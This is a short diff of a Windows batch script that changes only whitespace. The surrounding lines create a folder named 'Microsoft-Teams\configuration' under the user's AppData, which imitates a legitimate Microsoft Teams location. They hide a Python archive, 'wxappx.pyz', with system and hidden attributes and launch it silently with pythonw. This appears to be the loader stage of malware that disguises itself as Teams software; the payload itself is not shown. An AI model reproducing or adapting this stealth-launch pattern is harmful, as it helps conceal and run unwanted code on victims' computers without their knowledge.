@@ -1,7 +1,5 @@
 @echo off
 
-
-
 IF NOT EXIST "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\" (
     mkdir "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\"
 )
@@ -13,6 +11,7 @@ IF EXIST "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx
     attrib +s +h "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
     start "" pythonw "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
 )
+
 setlocal enabledelayedexpansion
 
 :: Liste des modules à vérifier
